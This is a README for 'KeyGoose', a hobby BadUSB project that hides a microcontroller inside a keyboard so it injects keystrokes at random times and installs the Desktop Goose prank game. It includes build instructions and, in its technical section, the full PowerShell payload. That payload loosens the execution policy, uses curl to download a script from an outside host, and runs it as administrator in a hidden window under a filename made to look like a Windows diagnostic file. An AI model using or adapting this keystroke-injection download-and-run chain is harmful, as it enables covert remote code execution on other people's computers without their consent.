# KeyGoose
###### Hacked By Me [Video 1](http://KeyGoose.HackedBy.Me "Video 1") Code
------------
##### KeyGoose is a fun implementation of a BadUSB, where a keyboard is "hacked" by wiring a microcontroller with custom firware to the inside of the keyboard. The microcontroller is designed to randomly deliver a payload (in the form of the [Desktop Goose Game](https://samperson.itch.io/desktop-goose "Desktop Goose Game")) to unsuspecting users in only 2.25 seconds.
------------
### What's Included in this Repository?
- A KeyGoose Parts List
- Written instructions as to how to create your own KeyGoose
- A technical explanation of how KeyGoose works
- The KeyGoose code (both the Driveby and Keyboard implementation) with which to flash the microcontroller
- The powershell script fetched and run by the KeyGoose upon payload injection

## Parts List
- A USB Keyboard
	- I recommend getting the cheapest keyboard you can find on Amazon. Not only will this bring-down the cost, but the cheaper keyboards tend to be more maleable and made of a weaker plastic, making the keyboard easier to manipulate when it comes to squeezing-in the microcontroller.
	- I also found that getting a keyboard that has a battery option was ideal, as it left a nice, open area in which to embed the microcontroller.
- A Microcontroller with USB Support
	- Any microcontroller should do, as long as it is small-enough and supports USB. In this project, I used a *Beetle ATmega32u4 Development Board*
- General Tools
	- Raspberry Pi with GPIO wires
		- You may use any other preferred method to flash the microcontroller, this is simply the option I went with, and will be explaining here.
	- Solder/Soldering Iron
	- Screw Driver
	- File Set
	- 26 AWG Wire
	- Wire Stripper

## Instructions
1. Flash the microcontroller with the provided code
1. Open the keyboard and wire the microcontroller to the controller in the Keyboard
1. Enjoy!

##### Step 1
Depending on where you bought your microcontroller, it may already come with a bootloader installed. For the purposes of this project, we're going to need to get rid of the bootloader, and flash the microcontroller with our code directly. In order to do so, you'll need to get some breadboard jumper wires and a Raspberry Pi.
> Please note: There are many other ways to flash the microcontroller, so if you'd prefer to use another method, feel free to do so!

In order to begin flashing the microcontroller with the Raspberry Pi, it's important to first identify the correct General Purpose Input Output pins to use. Lookup the pinout diagram for your microcontroller. The pinout of the Raspberry Pi can be found [here](https://pinout.xyz/# "here"). If you are using the Beetle that I used, then you may use the image below as a reference. I also found [this online article](https://ozzmaker.com/program-avr-using-raspberry-pi-gpio/ "this online article") to be extremely helpful.

![Raspberry Pi GPIO Photo](https://raw.githubusercontent.com/NoahTroy/KeyGoose/master/Raspberry%20Pi%20GPIO%20Photo.jpg "Raspberry Pi GPIO Photo")

Once we have the wiring all set, our next step is to dowload and install *avrdude* on the Raspberry Pi. This can be done by running:
`sudo apt install avrdude`
Now that avrdude is installed, it's important to edit the configuration file to support flashing over GPIO. Open the configuration file (`sudo nano /etc/avrdude.conf`) and find the commented-out programmer section with the ID: "linuxgpio". You're going to want to uncomment this entire section and replace the question marks with the values 4, 11, 10, and 9, in that order, to tell avrdude which GPIO pins to use. The uncommented section should now look like this:
```
programmer
  id    = "linuxgpio";
  desc  = "Use the Linux sysfs interface to bitbang GPIO lines";
  type  = "linuxgpio";
  reset = 4;
  sck   = 11;
  mosi  = 10;
  miso  = 9;
;
```
At this point, we are ready to flash the microcontroller. I was using an ATmega32U4 (the Beetle). If you are as well, then the following command should work just fine. If not, then make sure to modify the command appropriately for your hardware:
`sudo avrdude -c linuxgpio -p atmega32u4 -v -U flash:w:KeyGoose.hex`
If you wish to flash the Driveby version of KeyGoose, be sure to replace `KeyGoose.hex` with `DrivebyGoose.hex`, in the command above.
Congratulations, you have now successfully flashed the microcontroller!

##### Step 2
Before I share how I went about wiring the Keyboard and the microcontroller together, let me be clear: *I am not an electrical engineer. I can almost guarantee you that there is probably a better, more-technical way to do this. Although everything ended-up working fine for me, there's always the chance that this could be harmful to your devices. Proceed at your own risk.*

Alright, before we get to any of the soldering, the most important thing is to carefully open-up the keyboard, and identify where the USB controller is. Make sure you're looking for the point where the USB cable is *first* soldered into the PCB. For your sake, hopefully the keyboard manufacturer followed standards, labeling their PCB and correctly color-coding the wires. Right now, your job is to figure out which of the four solder points matches with which of the four (USB) pins on your microcontroller. If you're having trouble figuring it out, [this article](https://www.electroschematics.com/usb-how-things-work/ "this article") may help. You may also rewatch the [YouTube video](http://KeyGoose.HackedBy.Me "YouTube video") to see how I did it.
After you're certain that you have the correct match-up, strip the USB cabling and solder each of the four wires to the microcontroller, and the other ends to the corresponding point on the PCB. Once again, feel free to rewatch the [YouTube video](http://KeyGoose.HackedBy.Me "YouTube video") to see how I did it.
Finally, use the files to grind-out a spot within the keyboard to place the microcontroller. If you managed to get a keyboard that supports a battery, I recommend placing the microcontroller there, as there should be plenty of room, and you won't obstruct the normal operation of the keyboard.

##### Step 3
Enjoy! Just make sure that if you decide to use this keyboard to prank friends, family, or others, you do so responsibly, and you always have the necessary permissions first. If used improperly, you could have hacking charges filed against you.

> ##### If you do end up using this program, make sure you head over to Desktop Goose's [download page](https://samperson.itch.io/desktop-goose "Desktop Goose Game") first, and leave a tip for the developer. I did not create this game, and we owe all of the fun of this project to them. Out of respect to the developer, the Desktop Goose game installed by this code is an out of date version. If you wish to install the latest version, feel free to get it from the [download page](https://samperson.itch.io/desktop-goose "Desktop Goose Game"), and give your thanks to the developer.

## How Does KeyGoose Work?

KeyGoose works by emulating a USB Keyboard, and injecting keystrokes very quickly into the host computer at a designated time. Below, I'll outline the exact process that KeyGoose takes:
1. The keyboard emulation code initializes, and prepares itself to inject key presses.
1. A random seed is gathered by adding together the analog sensor values from A0 and A1.
1. A random value between 1 and 6 is generated. If the value is equal to 3, the code continues. If not, the program waits 30 minutes, before restarting from the beginning. This gives the code only about a 15% chance of running every 30 minutes and/or every time the user boots their computer.
1. If the program continued, a random time delay is generated between 4 and 20 minutes long. This time delay gives the computer time to finish booting, and maintains inconsistency, to further confuse the user.
1. After the time delay, the microcontroller sends the payload, disabling the actual keyboard while it does so.
	- The payload sent is a series of key combinations to open powershell as an administrator, and then run the following command:
	- `Set-ExecutionPolicy RemoteSigned -Force; cd C:\Windows\Temp; echo "Invoke-Expression 'curl -L http://KeyGoosePS1.HackedBy.Me -o d7893c3e.ps1; & .\d7893c3e.ps1; C:\Windows\Temp\tw-9dc-75c-5c965a3.tmp\DesktopGoose.exe; exit'" > DiagTrack_AlternativeTrace.ps1; start-process PowerShell.exe -arg $pwd\DiagTrack_AlternativeTrace.ps1 -WindowStyle Hidden; exit`
	- This command essentially downloads the PowerShell script into the Temp directory, gives it the necessary permissions to run, then runs it. This command is designed to be exeuted in the background though, so that the PowerShell window may be closed immediately, instead of having to wait on the download and execution of the script.
